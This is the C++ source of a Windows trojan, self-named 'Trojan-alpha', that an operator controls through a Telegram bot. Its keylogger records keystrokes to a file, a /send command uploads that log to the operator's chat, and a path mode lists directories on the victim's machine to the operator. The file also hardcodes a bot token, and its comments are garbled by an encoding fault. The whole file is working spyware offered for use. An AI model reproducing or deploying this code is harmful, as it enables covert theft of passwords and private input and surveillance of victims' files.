#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <tgbot/tgbot.h>
#include <filesystem>

namespace fs = std::filesystem;
const char* filename = "temp.txt";

// ������� ������������ ������� �� �������
void startKeyLogger(const TgBot::Bot &bot_ref, const int64_t chat_id) {
	using namespace std;
	
	while (true) 
	{
		ofstream outfile(filename, ios::app); // ������ ���� (���� �� ��� �� ����������)

		// ���������, ���� �� �������� � �������� � �����
		if (!outfile)
		{
			bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
			break;
		}

		for (int i = 0; i < 0xA3; i++)
		{
			// ���� ������� ���� ������...
			if (GetAsyncKeyState(i) & 0b1)
			{
				if (i >= 0x30 && i <= 0x5A)     // ������� �� 0 �� 9 � �� 'A' �� 'Z' https://learn.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes
					outfile << (char)i;

				else if (i == VK_RETURN)        // ������ �������
					outfile << "[ENTER]";

				else if (i == VK_BACK)
					outfile << "[BACKSPACE]";

				else if (i == VK_SPACE)
					outfile << ' ';

				else if (i == VK_SHIFT)
					outfile << "[SHIFT]";

				else if (i == VK_CONTROL)
					outfile << "[CTRL]";
			};
		}
		outfile.close();
	}
}

// �������������� ������� ������ � UTF8 ��� ������� �������� ��������� �� �������
std::string wstringToUtf8(const std::wstring& wstr) {
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

void startBot(std::string token) {
	TgBot::Bot bot(token);

	/*
	���� ������� ����� ���� - ������ ��� ������� �����: �� ����� ������ �������,
	���� �� �� �� ����, �� ������ ��������� �� ����� ��������� �������, � ����� ��������� ��,
	�� ��� �������� ����� (���� � �����, ����� ���������� �������� � �.�.)
	*/
	std::string currentMode = "";


	bot.getEvents().onCommand("start", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id,
				std::string("Hello, welcome to Trojan-alpha. Here's the commands you can use:\n")
				+ "/key_logger - starts key_logger (never ends);\n"
				+ "/send - sends a file with key logs;\n"
				+ "/check_path_mode - opens check_path mode;\n"
				+ "/end_mode - exits your current mode.\n");
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);

		});


	// ��������� ��������� �� ������� key_logger
	bot.getEvents().onCommand("key_logger", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty()) 
		{
			int64_t chat_id = message->chat->id;

			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
			std::thread keyLogger(startKeyLogger, std::ref(bot), chat_id);
			keyLogger.detach();
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// �������� ���� � �������� �� ������� send
	bot.getEvents().onCommand("send", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty()) 
		{
			// ���������, �� ������ �� ����
			std::ifstream inFile(filename);
			if (inFile.peek() == std::ifstream::traits_type::eof())
				bot.getApi().sendMessage(message->chat->id, "The file is empty.");
			else
				bot.getApi().sendDocument(message->chat->id, TgBot::InputFile::fromFile(filename, "text/plain"));
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);

		});

	
	// ��������� ����� ��������� �����
	bot.getEvents().onCommand("check_path_mode", [&bot, &currentMode](TgBot::Message::Ptr message) {
		if (currentMode.empty())
		{
			bot.getApi().sendMessage(message->chat->id, "Send a path you want to check.");
			currentMode = "check_path";
		}
		else
			bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode: " + currentMode);
		});


	// ��������� ���� ��������� �� ������������ �������� ����� � ������ �������
	bot.getEvents().onAnyMessage([&bot, &currentMode](TgBot::Message::Ptr message) {

		// ��� ������� ��������� ����� ��-�� �������� 
		std::string messageText = message->text;
		if (messageText == "/exit_mode") {
			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode: " + currentMode);
			currentMode = "";
			return;
		}

		if (currentMode == "check_path") 
		{
			std::string path = message->text;

			if (fs::exists(path)) {
				for (const auto& entry : fs::directory_iterator(path)) {
					std::wstring filePath = entry.path().wstring();

					// ����������� � std::string � ������� MultiByteToWideChar
					std::string filePathUtf8 = wstringToUtf8(filePath);

					bot.getApi().sendMessage(message->chat->id, filePathUtf8);
				}
			}
			else
				bot.getApi().sendMessage(message->chat->id, "It seems that this path does not exist.");
		}
		
		});


	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
		TgBot::TgLongPoll longPoll(bot);
		while (true) {
			longPoll.start();
		}
	}
	catch (TgBot::TgException& e) {
		printf("error: %s\n", e.what());
	}
}

int main()
{
	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");
	
	return 0;
}